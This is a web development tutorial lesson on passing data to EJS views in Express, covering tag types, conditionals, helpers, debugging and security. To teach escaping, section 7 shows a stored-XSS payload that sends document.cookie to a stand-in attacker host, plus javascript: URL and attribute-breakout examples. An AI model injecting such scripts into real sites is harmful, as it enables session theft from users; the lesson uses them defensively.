# 32 — Pass Data to Views

> **Goal:** Send data from route handlers to EJS templates with `res.render`, and use
> EJS tags to output values, use conditions, and understand HTML escaping.

---

## 1. The Idea

```js
res.render('index', { title: 'Home', name: 'Asha' });
```

The second argument — an object — becomes **variables** inside the template:

```html
<h1><%= title %></h1>
<p>Welcome, <%= name %>!</p>
```

Rendered HTML:

```html
<h1>Home</h1>
<p>Welcome, Asha!</p>
```

This object is often called **locals** (data local to this render).

---

## 2. Prerequisite Concept: EJS Tag Types

EJS embeds JavaScript between special tags.

| Tag | Name | Purpose |
|-----|------|---------|
| `<%= expr %>` | Escaped output | Print value, **HTML-escaped** (safe) |
| `<%- expr %>` | Unescaped output | Print raw HTML (**dangerous** with user data) |
| `<% code %>` | Scriptlet | Run JavaScript, no output (if, for, variables) |
| `<%# comment %>` | Comment | Ignored, not in output |
| `<%_ code _%>` | Whitespace slurp | Removes surrounding whitespace |
| `<%- include('file') %>` | Include | Insert another template (lesson 34) |
| `-%>` | Trim newline | Removes the trailing newline after the tag |
| `<%%` | Literal | Prints `<%` |

### Quick demo
```html
<% const greeting = 'Hello'; %>
<p><%= greeting %>, <%= name %>!</p>
<%# This comment will not appear %>
<p>2 + 3 = <%= 2 + 3 %></p>
<p>Now: <%= new Date().getFullYear() %></p>
```

Anything inside tags is **real JavaScript** executed on the server.

---

## 3. First Example: Passing Variables

### Route
```js
app.get('/', (req, res) => {
  res.render('index', {
    title: 'Express Crash Course',
    name: 'Asha',
    year: new Date().getFullYear(),
  });
});
```

### `views/index.ejs`
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title><%= title %></title>
  <link rel="stylesheet" href="/style.css" />
</head>
<body>
  <main class="container">
    <h1>Welcome, <%= name %>!</h1>
    <p>Copyright &copy; <%= year %></p>
  </main>
</body>
</html>
```

---

## 4. Data Types in Templates

```js
res.render('profile', {
  user: {
    name: 'Asha',
    email: 'asha@example.com',
    age: 22,
    isAdmin: false,
    skills: ['JavaScript', 'SQL', 'Linux'],
    address: { city: 'Hyderabad', country: 'India' },
  },
  score: 87.456,
  joined: new Date('2025-01-15'),
});
```

```html
<p>Name: <%= user.name %></p>
<p>City: <%= user.address.city %></p>
<p>First skill: <%= user.skills[0] %></p>
<p>Skill count: <%= user.skills.length %></p>
<p>Score: <%= score.toFixed(1) %></p>
<p>Joined: <%= joined.toLocaleDateString('en-IN') %></p>
<p>Uppercase: <%= user.name.toUpperCase() %></p>
```

Output is converted with `String(value)`. `null`/`undefined` print as empty text in
EJS (`<%= undefined %>` renders as an empty string).

---

## 5. Conditions

```html
<% if (user.isAdmin) { %>
  <p class="badge">Administrator</p>
<% } else { %>
  <p>Regular user</p>
<% } %>
```

### Rules for scriptlets
- `<% ... %>` runs code; **braces must be balanced across tags**.
- Everything between the tags (plain HTML) is output only when that branch runs.
- Common mistake: forgetting `{` or `}` → syntax error pointing at the `.ejs` line.

### Ternary for small cases
```html
<p>Status: <%= user.isAdmin ? 'Admin' : 'User' %></p>
<a class="<%= currentPath === '/about' ? 'active' : '' %>" href="/about">About</a>
```

### Truthiness for optional data
```html
<% if (message) { %>
  <div class="alert"><%= message %></div>
<% } %>
```

---

## 6. Handling Missing Variables

If a template uses a variable the route did not pass:

```
ReferenceError: index.ejs:5
    title is not defined
```

Solutions:

### a) Always pass it (preferred)
```js
res.render('index', { title: 'Home', message: null });
```

### b) Check with `locals`
EJS exposes the data object as `locals`:

```html
<title><%= locals.title || 'Default Title' %></title>

<% if (locals.message) { %>
  <p><%= message %></p>
<% } %>
```

`locals.x` returns `undefined` instead of throwing if `x` is missing.

### c) Global defaults with `app.locals` / `res.locals`
```js
app.locals.siteName = 'My Site';
app.use((req, res, next) => { res.locals.message = null; next(); });
```

---

## 7. Escaping: `<%=` vs `<%-` (Very Important) 🔐

Suppose a user saved this as their name:

```
<script>fetch('https://evil.example/steal?c=' + document.cookie)</script>
```

### Escaped output (safe)
```html
<p><%= name %></p>
```
Rendered HTML:

```html
<p>&lt;script&gt;fetch('https://evil.example/steal?c=' + document.cookie)&lt;/script&gt;</p>
```
The browser **shows** the text; it does not execute it.

### Raw output (dangerous)
```html
<p><%- name %></p>
```
The script **runs** for every visitor → **stored XSS**.

### What EJS escapes
| Character | Becomes |
|-----------|---------|
| `&` | `&amp;` |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&#34;` |
| `'` | `&#39;` |

### Use `<%-` only for
- Trusted HTML you wrote (e.g., `<%- include('partials/header') %>`)
- HTML that has been **sanitized** with a library (DOMPurify/sanitize-html)

### Context matters
EJS's escaping is for **HTML text and quoted attribute values**. Be careful in:

```html
<a href="<%= url %>">        <!-- javascript:alert(1) URLs are not HTML-escaped away! Validate scheme (http/https) -->
<script>var x = <%= value %>;</script>   <!-- NOT safe; use JSON.stringify + escaping, or avoid -->
<div onclick="<%= x %>">     <!-- avoid inline handlers with data -->
<style> ... <%= color %> ... </style>   <!-- CSS injection -->
```

Safe way to pass data to client JavaScript:

```html
<script id="data" type="application/json"><%- JSON.stringify(data).replace(/</g, '\\u003c') %></script>
<script>
  const data = JSON.parse(document.getElementById('data').textContent);
</script>
```

---

## 8. A Realistic Page: Post Detail

### Route
```js
import * as Post from '../models/postModel.js';

app.get('/posts/:id', (req, res, next) => {
  const id = Number(req.params.id);
  const post = Post.findById(id);

  if (!post) return next();                    // fall through to 404

  res.render('post', {
    title: post.title,
    post,
    isOwner: false,
  });
});
```

### `views/post.ejs`
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title><%= title %> | <%= siteName %></title>
  <link rel="stylesheet" href="/style.css" />
</head>
<body>
  <main class="container">
    <article>
      <h1><%= post.title %></h1>
      <p class="meta">Post #<%= post.id %></p>

      <% if (post.body) { %>
        <p><%= post.body %></p>
      <% } else { %>
        <p><em>No content yet.</em></p>
      <% } %>

      <% if (isOwner) { %>
        <a href="/posts/<%= post.id %>/edit">Edit</a>
      <% } %>
    </article>
    <a href="/">&larr; Back</a>
  </main>
</body>
</html>
```

---

## 9. Passing Data From Different Sources

| Source | Example |
|--------|---------|
| Static values | `{ title: 'Home' }` |
| Route params | `{ id: req.params.id }` (escape in view!) |
| Query string | `{ search: req.query.search }` — treat as untrusted |
| Database/model | `{ posts: Post.findAll() }` |
| Request-specific | `{ user: req.user }` |
| Environment | `{ env: process.env.NODE_ENV }` |
| Computed | `{ total: items.reduce(...) }` |

### Prepare data in the controller, keep views simple
```js
const posts = Post.findAll().map((p) => ({
  ...p,
  excerpt: p.title.slice(0, 40),
  createdLabel: new Date(p.createdAt).toLocaleDateString('en-IN'),
}));
res.render('posts', { posts });
```

Guideline: **views display, controllers decide.** Avoid heavy logic or database calls
inside templates.

---

## 10. Forms and Feedback Messages

```js
app.get('/contact', (req, res) => {
  res.render('contact', { title: 'Contact', errors: [], values: {} });
});

app.post('/contact', (req, res) => {
  const { name = '', email = '' } = req.body ?? {};
  const errors = [];
  if (!name.trim()) errors.push('Name is required');
  if (!email.includes('@')) errors.push('Valid email is required');

  if (errors.length) {
    return res.status(400).render('contact', {
      title: 'Contact',
      errors,
      values: { name, email },       // keep user input
    });
  }
  res.redirect(303, '/thanks');
});
```

```html
<% if (errors.length) { %>
  <ul class="errors">
    <% errors.forEach(function (e) { %>
      <li><%= e %></li>
    <% }) %>
  </ul>
<% } %>

<form method="POST" action="/contact">
  <input name="name" value="<%= values.name || '' %>" />
  <input name="email" value="<%= values.email || '' %>" />
  <button>Send</button>
</form>
```

(Looping over arrays is covered in depth in lesson 33.)

Note: values placed inside `value="..."` are escaped, including quotes, so
`" onfocus="alert(1)` cannot break out of the attribute.

---

## 11. Passing Functions and Helpers

```js
app.locals.formatDate = (d) => new Date(d).toLocaleDateString('en-IN');
app.locals.truncate = (s, n = 50) => (s.length > n ? s.slice(0, n) + '…' : s);
```

```html
<p><%= formatDate(post.createdAt) %></p>
<p><%= truncate(post.body, 80) %></p>
```

Keep helpers small and pure.

---

## 12. Whitespace Control

Scriptlets leave blank lines in the HTML source. Harmless, but you can tidy:

```html
<%_ if (items.length) { _%>
  <ul>...</ul>
<%_ } _%>
```

`<%_` removes preceding whitespace; `_%>` removes following whitespace and newline.
`-%>` removes only the trailing newline.

---

## 13. Debugging Templates

| Symptom | Cause | Fix |
|---------|-------|-----|
| `x is not defined` | Variable not passed | Pass it or use `locals.x` |
| Output shows `&lt;b&gt;` | Value contains HTML and you used `<%=` | Intended; use sanitized `<%-` only if trusted |
| Raw `<%= name %>` visible in browser | File served as static HTML, not rendered | Use `res.render`, remove from `public/` |
| `Unexpected token` at a line | Unbalanced `{ }` / missing `%>` | Check braces across tags |
| `Could not find matching close tag` | Typo like `<% if (x) { %` | Close with `%>` |
| Value prints `[object Object]` | Printing an object | Print a property or `JSON.stringify` |
| Date prints long string | Default `Date.toString()` | Format with `toLocaleDateString` |
| Blank where value expected | `undefined`/`null` | Check data in controller (`console.log`) |

Handy debug helper:

```html
<pre><%= JSON.stringify(locals, null, 2) %></pre>     <!-- development only! -->
```

---

## 14. Security Recap 🔐

1. Default to `<%= %>` for every dynamic value.
2. Treat `req.query`, `req.params`, `req.body`, DB text, headers, and file names as
   **untrusted** — even when "your own" database stores them.
3. Validate URLs before putting them in `href`/`src` (`http:`/`https:`/relative only).
4. Never inject data into `<script>` blocks or inline event handlers.
5. Don't pass sensitive fields (password hashes, tokens) to templates.
6. Add `helmet` with a Content-Security-Policy to limit XSS impact.
7. Never pass the whole `req.body`/`req.query` as render locals (option injection).

---

## 15. Exercises

1. Render `index.ejs` with `title`, `name`, `year` and display them.
2. Show different content when `isLoggedIn` is true or false.
3. Pass a user object with nested `address` and print every property.
4. Test XSS: pass `name = '<script>alert(1)</script>'` and compare `<%=` vs `<%-`.
5. Use `locals.message` so the page works whether or not `message` is passed.
6. Create `app.locals.formatDate` and use it in a template.
7. Build `post.ejs` (post detail) with a 404 fallback when the post is missing.
8. Build the contact page that re-displays user input and error messages.

### Challenge
Create a `/status` page that shows `process.uptime()` formatted as `Xh Ym Zs`,
`process.version`, the current `NODE_ENV`, and a colour-coded badge (green for
`production`, orange otherwise) using a ternary class.

---

## 16. Quick Quiz

1. Which EJS tag escapes output?
2. Which tag runs JavaScript without printing?
3. What does `<%- %>` do and why is it risky?
4. How can you read an optional variable without throwing?
5. What is stored XSS?
6. Where should heavy data preparation happen: controller or view?
7. What is `res.locals` for?
8. Is `<a href="<%= url %>">` automatically safe? Why or why not?

<details><summary>Answers</summary>

1. `<%= %>`.
2. `<% %>`.
3. Prints unescaped HTML; user data can inject scripts.
4. `locals.name`.
5. Malicious input saved on the server and later served to other users as executable script.
6. Controller.
7. Per-request variables available to templates.
8. No; HTML escaping doesn't stop `javascript:` URLs, so validate the scheme.
</details>

---

## 17. Summary

- `res.render('view', { ...data })` makes the keys available as variables in the template.
- `<%= %>` prints escaped values (default), `<%- %>` prints raw HTML (trusted only),
  `<% %>` runs JavaScript, `<%# %>` comments.
- Use `if/else` and ternaries for conditional display; `locals` for optional variables.
- Prepare data in controllers; keep views simple; never trust user input.
- Escaping protects HTML text/attributes but not URLs, scripts, or CSS contexts.

---

## 18. Next Lesson

➡️ **33 — Pass and Loop Over Arrays**
Render lists of posts using `forEach`, `for`, and `map` inside EJS.
